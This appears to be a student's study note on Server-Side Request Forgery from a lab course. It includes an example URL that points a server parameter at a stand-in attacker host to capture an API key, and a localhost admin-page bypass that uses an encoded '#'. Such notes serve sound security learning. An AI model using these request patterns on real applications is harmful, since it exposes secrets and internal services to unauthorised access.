# 10. Server-Side Request Forgery (SSRF)

## Server-Side Request Forgery

This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.

Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:

By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC`&#x20;

You could then just capture the contents of the request using Netcat:

This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:\


* Enumerate internal networks, including IP addresses and ports.
* Abuse trust relationships between servers and gain access to otherwise restricted services.
* Interact with some non-HTTP services to get remote code execution (RCE).

example:

in the website the admin page was only accessible from localhost. as you can see we are using ssrf and putting the website's url for that page. the vulnerable server is parsing the value of the server parameter in the SSRF request and using it in a subsequent request to the specified server. By changing the value of the server parameter to localhost:Port/admin%23, the subsequent request is made to the localhost on the specified port, and the admin page is accessed.

The %23 at the end of the URL is URL-encoded #, which is a comment character in URLs. This effectively comments out the \&id=75482342 parameter, which may not be necessary for accessing the admin page.

and we can't remove the \&id=75482342 part of the url becuase that makes our request invalid in the first place.
